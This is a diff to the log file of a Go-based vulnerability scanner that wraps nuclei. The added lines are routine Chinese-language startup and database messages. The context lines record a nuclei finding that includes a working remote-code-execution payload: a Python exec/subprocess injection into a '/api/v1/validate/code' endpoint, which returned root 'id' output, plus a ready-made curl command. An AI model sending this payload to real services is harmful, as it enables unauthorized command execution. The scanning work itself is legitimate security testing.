@@ -382,3 +382,73 @@ flag provided but not defined: -json
 2025-07-09T13:50:18.893+0800	[34mINFO[0m	scanner/executor.go:40	nuclei 扫描完成，输出结果: {"template-id":"code-validator-rce","template-path":"/Users/joker/code/VulnFusion/data/templates/test.yaml","template-encoded":"aWQ6IGNvZGUtdmFsaWRhdG9yLXJjZQoKaW5mbzoKICBuYW1lOiBSZW1vdGUgQ29kZSBFeGVjdXRpb24gaW4gL2FwaS92MS92YWxpZGF0ZS9jb2RlCiAgYXV0aG9yOiBmbG95ZAogIHNldmVyaXR5OiBoaWdoCiAgZGVzY3JpcHRpb246IHwKICAgIFRoaXMgdGVtcGxhdGUgZGV0ZWN0cyByZW1vdGUgY29kZSBleGVjdXRpb24gdmlhIHRoZSBgY29kZWAgZmllbGQgaW4gdGhlIGAvYXBpL3YxL3ZhbGlkYXRlL2NvZGVgIGVuZHBvaW50LgogIHRhZ3M6IHJjZSxhcGkKCnJlcXVlc3RzOgogIC0gbWV0aG9kOiBQT1NUCiAgICBwYXRoOgogICAgICAtICJ7e0Jhc2VVUkx9fS9hcGkvdjEvdmFsaWRhdGUvY29kZSIKCiAgICBoZWFkZXJzOgogICAgICBDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24KCiAgICBib2R5OiB8CiAgICAgIHsKICAgICAgICAiY29kZSI6ICJAZXhlYyhcInJhaXNlIEV4Y2VwdGlvbihfX2ltcG9ydF9fKCdzdWJwcm9jZXNzJykuY2hlY2tfb3V0cHV0KFsnaWQnXSkuZGVjb2RlKCkpXCIpXG5kZWYgZm9vKCk6XG4gIHBhc3MiCiAgICAgIH0KCiAgICBtYXRjaGVyczoKICAgICAgLSB0eXBlOiB3b3JkCiAgICAgICAgd29yZHM6CiAgICAgICAgICAtICJ1aWQ9IiAgIyBPdXRwdXQgZnJvbSAnaWQnIGNvbW1hbmQKICAgICAgICBwYXJ0OiBib2R5","info":{"name":"Remote Code Execution in /api/v1/validate/code","author":["floyd"],"tags":["rce","api"],"description":"This template detects remote code execution via the `code` field in the `/api/v1/validate/code` endpoint.\n","severity":"high"},"type":"http","host":"127.0.0.1:7860","port":"7860","scheme":"http","url":"http://127.0.0.1:7860","matched-at":"http://127.0.0.1:7860/api/v1/validate/code","request":"POST /api/v1/validate/code HTTP/1.1\r\nHost: 127.0.0.1:7860\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0\r\nConnection: close\r\nContent-Length: 122\r\nAccept: */*\r\nAccept-Language: en\r\nContent-Type: application/json\r\nAccept-Encoding: gzip\r\n\r\n{\r\n  \"code\": \"@exec(\\\"raise Exception(__import__('subprocess').check_output(['id']).decode())\\\")\\ndef foo():\\n  pass\"\r\n}\r\n","response":"HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 92\r\nContent-Type: application/json\r\nDate: Wed, 09 Jul 2025 05:50:18 GMT\r\nServer: uvicorn\r\n\r\n{\"imports\":{\"errors\":[]},\"function\":{\"errors\":[\"uid=0(root) gid=0(root) groups=0(root)\\n\"]}}","ip":"127.0.0.1","timestamp":"2025-07-09T13:50:18.887261+08:00","curl-command":"curl -X 'POST' -d '{\r\n  \"code\": \"@exec(\\\"raise Exception(__import__('\\''subprocess'\\'').check_output(['\\''id'\\'']).decode())\\\")\\ndef foo():\\n  pass\"\r\n}\r\n' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Content-Type: application/json' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0' 'http://127.0.0.1:7860/api/v1/validate/code'","matcher-status":true}
 
 2025-07-09T13:50:18.893+0800	[34mINFO[0m	scanner/parser.go:53	成功解析 1 条漏洞结果
+2025-07-09T14:56:45.989+0800	[34mINFO[0m	db/db.go:106	检测到模型 [user] 字段变化，重建中...
+2025-07-09T14:56:45.991+0800	[34mINFO[0m	db/db.go:147	模型 [user] 重建完成
+2025-07-09T14:56:45.991+0800	[34mINFO[0m	db/db.go:106	检测到模型 [task] 字段变化，重建中...
+2025-07-09T14:56:45.993+0800	[34mINFO[0m	db/db.go:147	模型 [task] 重建完成
+2025-07-09T14:56:45.993+0800	[34mINFO[0m	db/db.go:106	检测到模型 [result] 字段变化，重建中...
+2025-07-09T14:56:45.994+0800	[34mINFO[0m	db/db.go:147	模型 [result] 重建完成
+2025-07-09T14:56:45.994+0800	[34mINFO[0m	db/db.go:54	数据库初始化完成，路径：/Users/joker/code/VulnFusion/data/vulnfusion.db
+2025-07-09T14:56:45.994+0800	[34mINFO[0m	bootstrap/init.go:45	已存在管理员账号，无需初始化
+2025-07-09T14:56:45.994+0800	[34mINFO[0m	scanner/init.go:39	已检测到 nuclei 可执行文件：/Users/joker/code/VulnFusion/data/bin/nuclei
+2025-07-09T14:56:46.167+0800	[34mINFO[0m	scanner/init.go:49	nuclei 版本：[[34mINF[0m] Nuclei Engine Version: v3.4.7
+[[34mINF[0m] Nuclei Config Directory: /Users/joker/Library/Application Support/nuclei
+[[34mINF[0m] Nuclei Cache Directory: /Users/joker/Library/Caches/nuclei
+[[34mINF[0m] PDCP Directory: /Users/joker/.pdcp
+2025-07-09T14:56:46.167+0800	[34mINFO[0m	bootstrap/init.go:37	系统初始化完成
+2025-07-09T14:57:22.999+0800	[34mINFO[0m	db/db.go:106	检测到模型 [user] 字段变化，重建中...
+2025-07-09T14:57:23.001+0800	[34mINFO[0m	db/db.go:147	模型 [user] 重建完成
+2025-07-09T14:57:23.001+0800	[34mINFO[0m	db/db.go:106	检测到模型 [task] 字段变化，重建中...
+2025-07-09T14:57:23.002+0800	[34mINFO[0m	db/db.go:147	模型 [task] 重建完成
+2025-07-09T14:57:23.002+0800	[34mINFO[0m	db/db.go:106	检测到模型 [result] 字段变化，重建中...
+2025-07-09T14:57:23.003+0800	[34mINFO[0m	db/db.go:147	模型 [result] 重建完成
+2025-07-09T14:57:23.003+0800	[34mINFO[0m	db/db.go:54	数据库初始化完成，路径：/Users/joker/code/VulnFusion/data/vulnfusion.db
+2025-07-09T14:57:23.003+0800	[34mINFO[0m	bootstrap/init.go:45	已存在管理员账号，无需初始化
+2025-07-09T14:57:23.003+0800	[34mINFO[0m	scanner/init.go:39	已检测到 nuclei 可执行文件：/Users/joker/code/VulnFusion/data/bin/nuclei
+2025-07-09T14:57:23.053+0800	[34mINFO[0m	scanner/init.go:49	nuclei 版本：[[34mINF[0m] Nuclei Engine Version: v3.4.7
+[[34mINF[0m] Nuclei Config Directory: /Users/joker/Library/Application Support/nuclei
+[[34mINF[0m] Nuclei Cache Directory: /Users/joker/Library/Caches/nuclei
+[[34mINF[0m] PDCP Directory: /Users/joker/.pdcp
+2025-07-09T14:57:23.053+0800	[34mINFO[0m	bootstrap/init.go:37	系统初始化完成
+2025-07-09T14:59:16.315+0800	[34mINFO[0m	db/db.go:106	检测到模型 [user] 字段变化，重建中...
+2025-07-09T14:59:16.317+0800	[34mINFO[0m	db/db.go:147	模型 [user] 重建完成
+2025-07-09T14:59:16.317+0800	[34mINFO[0m	db/db.go:106	检测到模型 [task] 字段变化，重建中...
+2025-07-09T14:59:16.318+0800	[34mINFO[0m	db/db.go:147	模型 [task] 重建完成
+2025-07-09T14:59:16.318+0800	[34mINFO[0m	db/db.go:106	检测到模型 [result] 字段变化，重建中...
+2025-07-09T14:59:16.319+0800	[34mINFO[0m	db/db.go:147	模型 [result] 重建完成
+2025-07-09T14:59:16.319+0800	[34mINFO[0m	db/db.go:54	数据库初始化完成，路径：/Users/joker/code/VulnFusion/data/vulnfusion.db
+2025-07-09T14:59:16.319+0800	[34mINFO[0m	bootstrap/init.go:45	已存在管理员账号，无需初始化
+2025-07-09T14:59:16.319+0800	[34mINFO[0m	scanner/init.go:39	已检测到 nuclei 可执行文件：/Users/joker/code/VulnFusion/data/bin/nuclei
+2025-07-09T14:59:16.483+0800	[34mINFO[0m	scanner/init.go:49	nuclei 版本：[[34mINF[0m] Nuclei Engine Version: v3.4.7
+[[34mINF[0m] Nuclei Config Directory: /Users/joker/Library/Application Support/nuclei
+[[34mINF[0m] Nuclei Cache Directory: /Users/joker/Library/Caches/nuclei
+[[34mINF[0m] PDCP Directory: /Users/joker/.pdcp
+2025-07-09T14:59:16.483+0800	[34mINFO[0m	bootstrap/init.go:37	系统初始化完成
+2025-07-09T17:52:55.731+0800	[34mINFO[0m	db/db.go:106	检测到模型 [user] 字段变化，重建中...
+2025-07-09T17:52:55.733+0800	[34mINFO[0m	db/db.go:147	模型 [user] 重建完成
+2025-07-09T17:52:55.733+0800	[34mINFO[0m	db/db.go:106	检测到模型 [task] 字段变化，重建中...
+2025-07-09T17:52:55.735+0800	[34mINFO[0m	db/db.go:147	模型 [task] 重建完成
+2025-07-09T17:52:55.735+0800	[34mINFO[0m	db/db.go:106	检测到模型 [result] 字段变化，重建中...
+2025-07-09T17:52:55.736+0800	[34mINFO[0m	db/db.go:147	模型 [result] 重建完成
+2025-07-09T17:52:55.736+0800	[34mINFO[0m	db/db.go:54	数据库初始化完成，路径：/Users/joker/code/VulnFusion/data/vulnfusion.db
+2025-07-09T17:52:55.737+0800	[34mINFO[0m	bootstrap/init.go:45	已存在管理员账号，无需初始化
+2025-07-09T17:52:55.737+0800	[34mINFO[0m	scanner/init.go:39	已检测到 nuclei 可执行文件：/Users/joker/code/VulnFusion/data/bin/nuclei
+2025-07-09T17:52:55.923+0800	[34mINFO[0m	scanner/init.go:49	nuclei 版本：[[34mINF[0m] Nuclei Engine Version: v3.4.7
+[[34mINF[0m] Nuclei Config Directory: /Users/joker/Library/Application Support/nuclei
+[[34mINF[0m] Nuclei Cache Directory: /Users/joker/Library/Caches/nuclei
+[[34mINF[0m] PDCP Directory: /Users/joker/.pdcp
+2025-07-09T17:52:55.923+0800	[34mINFO[0m	bootstrap/init.go:37	系统初始化完成
+2025-07-09T17:57:32.094+0800	[34mINFO[0m	db/db.go:106	检测到模型 [user] 字段变化，重建中...
+2025-07-09T17:57:32.096+0800	[34mINFO[0m	db/db.go:147	模型 [user] 重建完成
+2025-07-09T17:57:32.096+0800	[34mINFO[0m	db/db.go:106	检测到模型 [task] 字段变化，重建中...
+2025-07-09T17:57:32.097+0800	[34mINFO[0m	db/db.go:147	模型 [task] 重建完成
+2025-07-09T17:57:32.097+0800	[34mINFO[0m	db/db.go:106	检测到模型 [result] 字段变化，重建中...
+2025-07-09T17:57:32.098+0800	[34mINFO[0m	db/db.go:147	模型 [result] 重建完成
+2025-07-09T17:57:32.098+0800	[34mINFO[0m	db/db.go:54	数据库初始化完成，路径：/Users/joker/code/VulnFusion/data/vulnfusion.db
+2025-07-09T17:57:32.098+0800	[34mINFO[0m	bootstrap/init.go:45	已存在管理员账号，无需初始化
+2025-07-09T17:57:32.098+0800	[34mINFO[0m	scanner/init.go:39	已检测到 nuclei 可执行文件：/Users/joker/code/VulnFusion/data/bin/nuclei
+2025-07-09T17:57:32.272+0800	[34mINFO[0m	scanner/init.go:49	nuclei 版本：[[34mINF[0m] Nuclei Engine Version: v3.4.7
+[[34mINF[0m] Nuclei Config Directory: /Users/joker/Library/Application Support/nuclei
+[[34mINF[0m] Nuclei Cache Directory: /Users/joker/Library/Caches/nuclei
+[[34mINF[0m] PDCP Directory: /Users/joker/.pdcp
+2025-07-09T17:57:32.272+0800	[34mINFO[0m	bootstrap/init.go:37	系统初始化完成
